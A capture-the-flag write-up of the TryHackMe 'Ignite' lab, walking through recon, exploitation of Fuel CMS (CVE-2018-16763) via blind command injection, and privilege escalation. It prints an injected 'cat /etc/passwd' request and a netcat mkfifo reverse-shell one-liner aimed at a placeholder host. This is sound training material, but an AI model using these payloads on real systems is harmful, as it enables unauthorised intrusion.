* Challenge Name: Ignite,
* Platform: TryHackMe,
* Type: Web,
* Difficulty: Easy

# Reconnaissance

1. We will take a look at the target website by entering the target IP in our browser.
We get to see some directory paths. It shows the service and version used (Fuel CMS 1.4). It has also given us credential admin:admin.
<img width="1338" height="616" alt="Ignite1" src="https://github.com/user-attachments/assets/b50d05d1-6070-466d-bbe0-a62140b921c7" />

<img width="1166" height="605" alt="Ignite2" src="https://github.com/user-attachments/assets/6ba7a916-9b55-4dd5-8415-26cff22e185b" />


2. Running Nmap shows that port 80 is open on which Apache httpd 2.4.18 is running.
<img width="670" height="180" alt="Ignite3" src="https://github.com/user-attachments/assets/46aad0e5-17cd-48d4-bf74-926132c94ff7" />


3. Now I'll use feroxbuster in order to find hidden directories. It is returning a directory /fuel/login.
<img width="1135" height="582" alt="Ignite4" src="https://github.com/user-attachments/assets/d33a6df1-0497-4fbb-a308-452f6533e382" />


4. I want to find vulnerabilities on the target. To speed up this process, I'll use "nuclei" tool.
It gives us many valuable information. One of them is a critical vulnerability of CVE-2018-16763 along with a URL with which the vulnerability can be exploited.
It also told that /robots.txt exists, but checking it didn't reveal anything interesting. 
We also cross checked on our search engine whether our target is vulnerable to CVE-2018-16763 or not and we found that it really is because of Fuel CMS.
<img width="1488" height="574" alt="Ignite5" src="https://github.com/user-attachments/assets/0ee31e7d-778b-4b0f-a6a7-6a1f7a12ce1d" />


# Exploitation

1. Navigate to the path found during enumeration. We can see a login page where we will use the credential we got initially. A dashboard page can be seen.
<img width="1530" height="665" alt="Ignite6" src="https://github.com/user-attachments/assets/71513ad5-a1d2-4677-98b0-d88759407a09" />


2. Now, I'll use the link given by nuclei to exploit the vulnerability.
In the link, we can see that there is a part in which Linux command has been used along with URL encoding (cat%20/etc/passwd).
This can mean that the vulnerability is "Command Injection", but the output is not shown on the screen which means that this is "Blind Command Injection".
To verify that, we can try using ping command which causes the website to load late.
<img width="1533" height="608" alt="Ignite7" src="https://github.com/user-attachments/assets/83b6fe17-083e-4a62-ba55-1ef62d603e42" />


3. If we can inject commmands in the URL, we can also inject payloads to establish reverse shell.
Firstly, I used netcat to listen on port 1234. Then I picked up an online available netcat payload for reverse shell (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 1234 >/tmp/f).
Then I used CyberChef to URL encode it. After injecting it, we get a shell.
<img width="1533" height="557" alt="Ignite9" src="https://github.com/user-attachments/assets/516bdc0d-76f7-4762-a5c1-a5d51949d35f" />


4. We got the shell, but is not fully functional.
In order to make it fully functional we run the command:- script -qc /bin/bash /dev/null.
Then we background the session using "ctrl+z".
Then we run the command:- stty raw -echo; fg. "raw" prevents Local processing i.e. Preventing the termination of session by ctrl+c, ctr+z.
"-echo" disables local echoing, thereby preventing duplicated or scrambled characters.
"fg" will take you back to the background session.
Then we enter:- export TERM=xterm-256color. This prevents text editors from throwing errors.
With this, we successfully get a fully functional terminal.
<img width="1535" height="439" alt="Ignite10" src="https://github.com/user-attachments/assets/c93b5ec2-0867-4f0e-b29f-ed55d21946d5" />


5. We need answers for User.txt and Root.txt. We know that a user's files are generally in the /home directory.
So, I navigated to /home. By navigating in further directory, we finally got the file "flag.txt" which gives answer for User.txt
<img width="302" height="94" alt="Ignite11" src="https://github.com/user-attachments/assets/6a3f1a5a-20d0-4e36-8eea-c2ef3b225538" />


6. Now, I need root access. Let's have a look at the directories we found at the initial page. In the database part, we can see an interesting file path.
I navigated it and found password for root. Due to this, I gained root access. I quickly looked in the /root directory and found Root.txt.
<img width="762" height="186" alt="Ignite12" src="https://github.com/user-attachments/assets/c02bd857-5348-4fba-92b3-efed08cd1572" />

<img width="511" height="278" alt="Ignite13" src="https://github.com/user-attachments/assets/fa614b4c-bcc8-418e-86df-8cf9266e293b" />

<img width="686" height="393" alt="Ignite14" src="https://github.com/user-attachments/assets/ad38162a-d8ab-4c00-b691-07bb16ae42c6" />

<img width="442" height="114" alt="Ignite15" src="https://github.com/user-attachments/assets/b54322cc-0fc5-4b3d-bba0-84c60a1bb67f" />

# What I learnt:-

1. Websites should always use up-to-date version of services.
2. User input shouldn't be run without proper sanitization in order to prevent attacks like Command Injection.
3. Passwords shouldn't be stored in files which are accessible to everyone.
